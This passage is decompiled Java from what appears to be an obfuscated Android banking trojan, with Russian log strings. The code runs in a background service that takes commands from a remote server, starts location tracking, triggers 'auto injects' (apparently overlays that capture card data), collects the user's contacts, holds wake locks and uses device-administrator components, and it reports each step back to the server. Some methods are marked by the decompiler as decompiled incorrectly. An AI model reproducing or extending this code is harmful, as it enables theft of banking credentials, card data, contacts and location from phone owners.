                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r4 = r4.f423e
                    java.lang.String r5 = "network"
                    java.lang.String r3 = r3.mo234e(r4, r5)
                    java.lang.String r4 = "false"
                    boolean r3 = r3.equals(r4)
                    if (r3 == 0) goto L_0x054c
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r4 = r4.f423e
                    java.lang.String r5 = "gps"
                    java.lang.String r3 = r3.mo234e(r4, r5)
                    java.lang.String r4 = "false"
                    boolean r3 = r3.equals(r4)
                    if (r3 == 0) goto L_0x054c
                    java.lang.String r3 = "true"
                    boolean r3 = r12.contains(r3)
                    if (r3 == 0) goto L_0x04e3
                    java.lang.String r3 = "1"
                    goto L_0x04e5
                L_0x04e3:
                    java.lang.String r3 = "0"
                L_0x04e5:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r4 = r4.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r5 = r5.f423e
                    java.lang.String r6 = "7"
                    java.lang.StringBuilder r7 = new java.lang.StringBuilder
                    r7.<init>()
                    java.lang.String r8 = "p="
                    r7.append(r8)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r8 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r8 = r8.f420b
                    java.lang.StringBuilder r9 = new java.lang.StringBuilder
                    r9.<init>()
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r10 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r10 = r10.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r11 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r11 = r11.f423e
                    java.lang.String r10 = r10.mo247q(r11)
                    r9.append(r10)
                    java.lang.String r10 = ":Geolocation:"
                    r9.append(r10)
                    r9.append(r3)
                    java.lang.String r3 = ":"
                    r9.append(r3)
                    java.lang.String r3 = r9.toString()
                    java.lang.String r3 = r8.mo225c(r3)
                    r7.append(r3)
                    java.lang.String r3 = r7.toString()
                    java.lang.String r3 = r4.mo218b(r5, r6, r3)
                    java.lang.String r4 = "2453512"
                    boolean r3 = r3.contains(r4)
                    if (r3 == 0) goto L_0x054c
                    java.lang.String r3 = "4 "
                    java.lang.String r4 = "4+"
                    java.lang.String r2 = r2.replace(r3, r4)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r4 = "Вып настр"
                    java.lang.String r5 = "Запуск геолокации"
                    r3.mo213a(r4, r5)
                L_0x054c:
                    java.util.concurrent.TimeUnit r3 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x0554 }
                    r4 = 1000(0x3e8, double:4.94E-321)
                    r3.sleep(r4)     // Catch:{ InterruptedException -> 0x0554 }
                    goto L_0x0559
                L_0x0554:
                    r0 = move-exception
                    r3 = r0
                    r3.printStackTrace()
                L_0x0559:
                    r3 = 268435456(0x10000000, float:2.5243549E-29)
                    r4 = -1
                    if (r19 != 0) goto L_0x05e8
                    int r5 = android.os.Build.VERSION.SDK_INT
                    r6 = 24
                    if (r5 < r6) goto L_0x05ad
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r5 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r5 = r5.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r6 = r6.f423e
                    boolean r5 = r5.mo237g(r6)
                    if (r5 != 0) goto L_0x05ad
                    r5 = r18
                    if (r13 > r5) goto L_0x05af
                    if (r13 == r4) goto L_0x05af
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    boolean r6 = r6.mo238h(r7)
                    if (r6 != 0) goto L_0x05af
                    android.content.Intent r6 = new android.content.Intent
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.dzudmx> r8 = wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.class
                    r6.<init>(r7, r8)
                    java.lang.String r7 = "start"
                    java.lang.String r8 = "statistic"
                    android.content.Intent r6 = r6.putExtra(r7, r8)
                    r6.addFlags(r3)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    r7.startActivity(r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    java.lang.String r7 = "Вып настр"
                    java.lang.String r8 = "/PROC 7.0 "
                    r6.mo213a(r7, r8)
                    goto L_0x05af
                L_0x05ad:
                    r5 = r18
                L_0x05af:
                    if (r15 > r5) goto L_0x05ea
                    if (r15 == r4) goto L_0x05ea
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    boolean r6 = r6.mo241k(r7)
                    if (r6 != 0) goto L_0x05ea
                    android.content.Intent r6 = new android.content.Intent
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.dzudmx> r8 = wocwvy.czyxoxmbauu.slsa.ncec.dzudmx.class
                    r6.<init>(r7, r8)
                    java.lang.String r7 = "start"
                    java.lang.String r8 = "gps"
                    android.content.Intent r6 = r6.putExtra(r7, r8)
                    r6.addFlags(r3)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    r7.startActivity(r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    java.lang.String r7 = "Вып настр"
                    java.lang.String r8 = "START blkzyyyfc"
                    r6.mo213a(r7, r8)
                    goto L_0x05ea
                L_0x05e8:
                    r5 = r18
                L_0x05ea:
                    java.util.concurrent.TimeUnit r6 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x05f2 }
                    r7 = 1000(0x3e8, double:4.94E-321)
                    r6.sleep(r7)     // Catch:{ InterruptedException -> 0x05f2 }
                    goto L_0x05f7
                L_0x05f2:
                    r0 = move-exception
                    r6 = r0
                    r6.printStackTrace()
                L_0x05f7:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    java.lang.String r7 = "SSS"
                    java.lang.StringBuilder r8 = new java.lang.StringBuilder
                    r8.<init>()
                    java.lang.String r9 = ""
                    r8.append(r9)
                    r8.append(r2)
                    java.lang.String r8 = r8.toString()
                    r6.mo213a(r7, r8)
                    java.lang.String r6 = "7 8"
                    boolean r6 = r2.contains(r6)
                    if (r6 == 0) goto L_0x069d
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.String r8 = "save_inj"
                    java.lang.String r6 = r6.mo234e(r7, r8)
                    int r6 = r6.length()
                    r7 = 6
                    if (r6 > r7) goto L_0x069d
                    r6 = r30
                    if (r6 > r5) goto L_0x069d
                    if (r6 == r4) goto L_0x069d
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.String r8 = "7"
                    java.lang.StringBuilder r9 = new java.lang.StringBuilder
                    r9.<init>()
                    java.lang.String r10 = "p="
                    r9.append(r10)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r10 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r10 = r10.f420b
                    java.lang.StringBuilder r11 = new java.lang.StringBuilder
                    r11.<init>()
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r12 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r12 = r12.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r13 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r13 = r13.f423e
                    java.lang.String r12 = r12.mo247q(r13)
                    r11.append(r12)
                    java.lang.String r12 = ":autoInj:"
                    r11.append(r12)
                    r12 = r29
                    r11.append(r12)
                    java.lang.String r12 = ":"
                    r11.append(r12)
                    java.lang.String r11 = r11.toString()
                    java.lang.String r10 = r10.mo225c(r11)
                    r9.append(r10)
                    java.lang.String r9 = r9.toString()
                    java.lang.String r6 = r6.mo218b(r7, r8, r9)
                    java.lang.String r7 = "2453512"
                    boolean r6 = r6.contains(r7)
                    if (r6 == 0) goto L_0x069d
                    java.lang.String r6 = "7 "
                    java.lang.String r7 = "7+"
                    java.lang.String r2 = r2.replace(r6, r7)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    java.lang.String r7 = "Вып настр"
                    java.lang.String r8 = "Авто инжекты + СС"
                    r6.mo213a(r7, r8)
                L_0x069d:
                    java.util.concurrent.TimeUnit r6 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x06a5 }
                    r7 = 1000(0x3e8, double:4.94E-321)
                    r6.sleep(r7)     // Catch:{ InterruptedException -> 0x06a5 }
                    goto L_0x06aa
                L_0x06a5:
                    r0 = move-exception
                    r6 = r0
                    r6.printStackTrace()
                L_0x06aa:
                    java.lang.String r6 = "8 9"
                    boolean r6 = r2.contains(r6)
                    if (r6 == 0) goto L_0x0736
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.String r8 = "save_inj"
                    java.lang.String r6 = r6.mo234e(r7, r8)
                    int r6 = r6.length()
                    r7 = 6
                    if (r6 > r7) goto L_0x0736
                    r6 = r27
                    if (r6 > r5) goto L_0x0736
                    if (r6 == r4) goto L_0x0736
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.String r8 = "7"
                    java.lang.StringBuilder r9 = new java.lang.StringBuilder
                    r9.<init>()
                    java.lang.String r10 = "p="
                    r9.append(r10)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r10 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r10 = r10.f420b
                    java.lang.StringBuilder r11 = new java.lang.StringBuilder
                    r11.<init>()
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r12 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r12 = r12.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r13 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r13 = r13.f423e
                    java.lang.String r12 = r12.mo247q(r13)
                    r11.append(r12)
                    java.lang.String r12 = ":Inj:"
                    r11.append(r12)
                    r12 = r28
                    r11.append(r12)
                    java.lang.String r12 = ":"
                    r11.append(r12)
                    java.lang.String r11 = r11.toString()
                    java.lang.String r10 = r10.mo225c(r11)
                    r9.append(r10)
                    java.lang.String r9 = r9.toString()
                    java.lang.String r6 = r6.mo218b(r7, r8, r9)
                    java.lang.String r7 = "2453512"
                    boolean r6 = r6.contains(r7)
                    if (r6 == 0) goto L_0x0736
                    java.lang.String r6 = "8 "
                    java.lang.String r7 = "8+"
                    java.lang.String r2 = r2.replace(r6, r7)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    java.lang.String r7 = "Вып настр"
                    java.lang.String r8 = "Авто инжекты + СС"
                    r6.mo213a(r7, r8)
                L_0x0736:
                    java.lang.String r6 = "9 "
                    boolean r6 = r2.contains(r6)
                    if (r6 == 0) goto L_0x07a5
                    r6 = r25
                    if (r6 > r5) goto L_0x07a5
                    if (r6 == r4) goto L_0x07a5
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    boolean r6 = r6.mo245o(r7)
                    if (r6 == 0) goto L_0x07a5
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r6 = r6.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    r6.mo227c(r7)
                    java.util.concurrent.TimeUnit r6 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x0765 }
                    r7 = 1000(0x3e8, double:4.94E-321)
                    r6.sleep(r7)     // Catch:{ InterruptedException -> 0x0765 }
                    goto L_0x076a
                L_0x0765:
                    r0 = move-exception
                    r6 = r0
                    r6.printStackTrace()
                L_0x076a:
                    android.content.Intent r6 = new android.content.Intent
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r7 = r7.f423e
                    java.lang.Class<wocwvy.czyxoxmbauu.slsa.ncec.wami> r8 = wocwvy.czyxoxmbauu.slsa.ncec.wami.class
                    r6.<init>(r7, r8)
                    java.lang.String r7 = "str"
                    java.lang.String r8 = "0"
                    android.content.Intent r6 = r6.putExtra(r7, r8)
                    java.lang.String r7 = "cwc_text"
                    java.lang.String r8 = ""
                    android.content.Intent r6 = r6.putExtra(r7, r8)
                    r6.addFlags(r3)
                    r3 = 1073741824(0x40000000, float:2.0)
                    r6.addFlags(r3)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    r3.startActivity(r6)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r6 = "Вып настр"
                    java.lang.String r7 = "Получить контакты"
                    r3.mo213a(r6, r7)
                    java.lang.String r3 = "9 "
                    java.lang.String r6 = "9+"
                    java.lang.String r2 = r2.replace(r3, r6)
                L_0x07a5:
                    java.util.concurrent.TimeUnit r3 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x07ad }
                    r6 = 1000(0x3e8, double:4.94E-321)
                    r3.sleep(r6)     // Catch:{ InterruptedException -> 0x07ad }
                    goto L_0x07b2
                L_0x07ad:
                    r0 = move-exception
                    r3 = r0
                    r3.printStackTrace()
                L_0x07b2:
                    java.lang.String r3 = "10 "
                    boolean r3 = r2.contains(r3)
                    if (r3 == 0) goto L_0x084b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r6 = r6.f423e
                    java.lang.String r7 = "network"
                    java.lang.String r3 = r3.mo234e(r6, r7)
                    java.lang.String r6 = "false"
                    boolean r3 = r3.equals(r6)
                    if (r3 == 0) goto L_0x084b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r6 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r6 = r6.f423e
                    java.lang.String r7 = "gps"
                    java.lang.String r3 = r3.mo234e(r6, r7)
                    java.lang.String r6 = "false"
                    boolean r3 = r3.equals(r6)
                    if (r3 == 0) goto L_0x084b
                    r3 = r26
                    if (r3 > r5) goto L_0x084b
                    if (r3 == r4) goto L_0x084b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r4 = r4.f423e
                    java.lang.String r5 = "7"
                    java.lang.StringBuilder r6 = new java.lang.StringBuilder
                    r6.<init>()
                    java.lang.String r7 = "p="
                    r6.append(r7)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r7 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r7 = r7.f420b
                    java.lang.StringBuilder r8 = new java.lang.StringBuilder
                    r8.<init>()
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r9 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r9 = r9.f420b
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r10 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    android.content.Context r10 = r10.f423e
                    java.lang.String r9 = r9.mo247q(r10)
                    r8.append(r9)
                    java.lang.String r9 = ":Geolocation:1:"
                    r8.append(r9)
                    java.lang.String r8 = r8.toString()
                    java.lang.String r7 = r7.mo225c(r8)
                    r6.append(r7)
                    java.lang.String r6 = r6.toString()
                    java.lang.String r3 = r3.mo218b(r4, r5, r6)
                    java.lang.String r4 = "2453512"
                    boolean r3 = r3.contains(r4)
                    if (r3 == 0) goto L_0x084b
                    java.lang.String r3 = "10 "
                    java.lang.String r4 = "10+"
                    java.lang.String r2 = r2.replace(r3, r4)
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b
                    java.lang.String r4 = "Вып настр"
                    java.lang.String r5 = "Запуск blkzyyyfc по тайму"
                    r3.mo213a(r4, r5)
                L_0x084b:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0873 }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x0873 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r4 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0873 }
                    android.content.Context r4 = r4.f423e     // Catch:{ Exception -> 0x0873 }
                    java.lang.String r5 = "madeSettings"
                    r3.mo233d(r4, r5, r2)     // Catch:{ Exception -> 0x0873 }
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r3 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this     // Catch:{ Exception -> 0x0873 }
                    wocwvy.czyxoxmbauu.slsa.b r3 = r3.f420b     // Catch:{ Exception -> 0x0873 }
                    java.lang.String r4 = "jtfxlnc"
                    java.lang.StringBuilder r5 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0873 }
                    r5.<init>()     // Catch:{ Exception -> 0x0873 }
                    java.lang.String r6 = "Save madeSettings: "
                    r5.append(r6)     // Catch:{ Exception -> 0x0873 }
                    r5.append(r2)     // Catch:{ Exception -> 0x0873 }
                    java.lang.String r2 = r5.toString()     // Catch:{ Exception -> 0x0873 }
                    r3.mo213a(r4, r2)     // Catch:{ Exception -> 0x0873 }
                    return
                L_0x0873:
                    wocwvy.czyxoxmbauu.slsa.jtfxlnc r2 = wocwvy.czyxoxmbauu.slsa.jtfxlnc.this
                    wocwvy.czyxoxmbauu.slsa.b r2 = r2.f420b
                    java.lang.String r3 = "jtfxlnc"
                    java.lang.String r4 = "ERROR Save madeSettings"
                    r2.mo213a(r3, r4)
                L_0x087e:
                    return
                */
                throw new UnsupportedOperationException("Method not decompiled: wocwvy.czyxoxmbauu.slsa.jtfxlnc.C00421.run():void");
            }
        }).start();
    }

    /* access modifiers changed from: protected */
    /* JADX WARNING: Code restructure failed: missing block: B:12:0x0055, code lost:
        if (r4 == null) goto L_0x0057;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:8:0x002c */
    /* JADX WARNING: Removed duplicated region for block: B:102:0x029f  */
    /* JADX WARNING: Removed duplicated region for block: B:109:0x02bd  */
    /* JADX WARNING: Removed duplicated region for block: B:124:0x0310  */
    /* JADX WARNING: Removed duplicated region for block: B:143:0x038c A[Catch:{ Exception -> 0x0391 }] */
    /* JADX WARNING: Removed duplicated region for block: B:149:0x03a2  */
    /* JADX WARNING: Removed duplicated region for block: B:18:0x005c  */
    /* JADX WARNING: Removed duplicated region for block: B:195:0x0506  */
    /* JADX WARNING: Removed duplicated region for block: B:198:0x052d  */
    /* JADX WARNING: Removed duplicated region for block: B:201:0x0552  */
    /* JADX WARNING: Removed duplicated region for block: B:216:0x05bb  */
    /* JADX WARNING: Removed duplicated region for block: B:227:0x0621 A[ADDED_TO_REGION] */
    /* JADX WARNING: Removed duplicated region for block: B:40:0x00d3  */
    /* JADX WARNING: Removed duplicated region for block: B:46:0x00f5  */
    /* JADX WARNING: Removed duplicated region for block: B:51:0x010e A[Catch:{ Exception -> 0x0160 }] */
    /* JADX WARNING: Removed duplicated region for block: B:82:0x0203 A[Catch:{ Exception -> 0x0237 }] */
    /* JADX WARNING: Removed duplicated region for block: B:95:0x0270  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public void onHandleIntent(android.content.Intent r18) {
        /*
            r17 = this;
            r1 = r17
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            boolean r2 = r2.mo214a()
            if (r2 == 0) goto L_0x000b
            return
        L_0x000b:
            r1.f423e = r1
            wocwvy.czyxoxmbauu.slsa.b r2 = r1.f420b
            java.lang.String r3 = "STARTWHILE"
            java.lang.String r4 = "!!!"
            r2.mo213a(r3, r4)
            r2 = 1
            android.content.Context r3 = r1.f423e     // Catch:{ Exception -> 0x002c }
            java.lang.String r4 = "power"
            java.lang.Object r3 = r3.getSystemService(r4)     // Catch:{ Exception -> 0x002c }
            android.os.PowerManager r3 = (android.os.PowerManager) r3     // Catch:{ Exception -> 0x002c }
            java.lang.String r4 = r1.f422d     // Catch:{ Exception -> 0x002c }
            android.os.PowerManager$WakeLock r3 = r3.newWakeLock(r2, r4)     // Catch:{ Exception -> 0x002c }
            if (r3 == 0) goto L_0x002c
            r3.acquire()     // Catch:{ Exception -> 0x002c }
        L_0x002c:
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b     // Catch:{ Exception -> 0x0057 }
            java.lang.String r5 = "swspacket"
            java.lang.String r4 = r4.mo234e(r1, r5)     // Catch:{ Exception -> 0x0057 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f420b     // Catch:{ Exception -> 0x0057 }
            java.lang.String r6 = "jtfxlnc"
            java.lang.StringBuilder r7 = new java.lang.StringBuilder     // Catch:{ Exception -> 0x0057 }
            r7.<init>()     // Catch:{ Exception -> 0x0057 }
            java.lang.String r8 = "App Packet "
            r7.append(r8)     // Catch:{ Exception -> 0x0057 }
            r7.append(r4)     // Catch:{ Exception -> 0x0057 }
            java.lang.String r7 = r7.toString()     // Catch:{ Exception -> 0x0057 }
            r5.mo213a(r6, r7)     // Catch:{ Exception -> 0x0057 }
            wocwvy.czyxoxmbauu.slsa.b r5 = r1.f420b     // Catch:{ Exception -> 0x0059 }
            java.lang.String r6 = "jtfxlnc"
            java.lang.String r7 = "swspacket"
            r5.mo213a(r6, r7)     // Catch:{ Exception -> 0x0059 }
            if (r4 != 0) goto L_0x0059
        L_0x0057:
            r4 = 0
            goto L_0x005a
        L_0x0059:
            r4 = 1
        L_0x005a:
            if (r4 != 0) goto L_0x0061
            wocwvy.czyxoxmbauu.slsa.b r4 = r1.f420b
            r4.mo221b(r1)
        L_0x0061:
            r4 = -1
            wocwvy.czyxoxmbauu.slsa.b r6 = r1.f420b     // Catch:{ Exception -> 0x0071 }
            android.content.Context r7 = r1.f423e     // Catch:{ Exception -> 0x0071 }
            java.lang.String r8 = "interval"
            java.lang.String r6 = r6.mo234e(r7, r8)     // Catch:{ Exception -> 0x0071 }
            int r6 = java.lang.Integer.parseInt(r6)     // Catch:{ Exception -> 0x0071 }
            goto L_0x0073
        L_0x0071:
            r6 = 15
        L_0x0073:
            wocwvy.czyxoxmbauu.slsa.b r8 = r1.f420b     // Catch:{ Exception -> 0x0084 }
            java.lang.String r9 = "time_work"
            java.lang.String r8 = r8.mo234e(r1, r9)     // Catch:{ Exception -> 0x0084 }
            int r8 = java.lang.Integer.parseInt(r8)     // Catch:{ Exception -> 0x0084 }
            r12 = r6
            r4 = 1000(0x3e8, float:1.401E-42)
            r6 = 0
            goto L_0x0089
        L_0x0084:
            r12 = r6
            r4 = 1000(0x3e8, float:1.401E-42)
            r6 = 0
            r8 = 0
        L_0x0089:
            r9 = -1
            r10 = 0
            r11 = 0
        L_0x008c:
            java.util.concurrent.TimeUnit r13 = java.util.concurrent.TimeUnit.MILLISECONDS     // Catch:{ InterruptedException -> 0x0093 }
            long r14 = (long) r4     // Catch:{ InterruptedException -> 0x0093 }
            r13.sleep(r14)     // Catch:{ InterruptedException -> 0x0093 }
            goto L_0x0098
        L_0x0093:
            r0 = move-exception
            r4 = r0
            r4.printStackTrace()
        L_0x0098:
            java.lang.String r4 = "device_policy"
            java.lang.Object r4 = r1.getSystemService(r4)
            android.app.admin.DevicePolicyManager r4 = (android.app.admin.DevicePolicyManager) r4
            android.content.ComponentName r13 = new android.content.ComponentName
            android.content.Context r14 = r1.f423e
            java.lang.Class<wocwvy.czyxoxmbauu.slsa.oyqwzkyy.a.a> r15 = wocwvy.czyxoxmbauu.slsa.oyqwzkyy.p002a.C0064a.class
            r13.<init>(r14, r15)
            wocwvy.czyxoxmbauu.slsa.b r14 = r1.f420b     // Catch:{ Exception -> 0x00c1 }
            android.content.Context r14 = r1.f423e     // Catch:{ Exception -> 0x00c1 }
            java.lang.String r15 = "startAlarm"
            wocwvy.czyxoxmbauu.slsa.b r7 = r1.f420b     // Catch:{ Exception -> 0x00c1 }
            android.content.Context r5 = r1.f423e     // Catch:{ Exception -> 0x00c1 }
            java.lang.String r3 = "Interval"
            java.lang.String r3 = r7.mo234e(r5, r3)     // Catch:{ Exception -> 0x00c1 }
            int r3 = java.lang.Integer.parseInt(r3)     // Catch:{ Exception -> 0x00c1 }
            long r2 = (long) r3     // Catch:{ Exception -> 0x00c1 }
            wocwvy.czyxoxmbauu.slsa.C0034b.m231a(r14, r15, r2)     // Catch:{ Exception -> 0x00c1 }
        L_0x00c1:
            android.content.Context r2 = r1.f423e
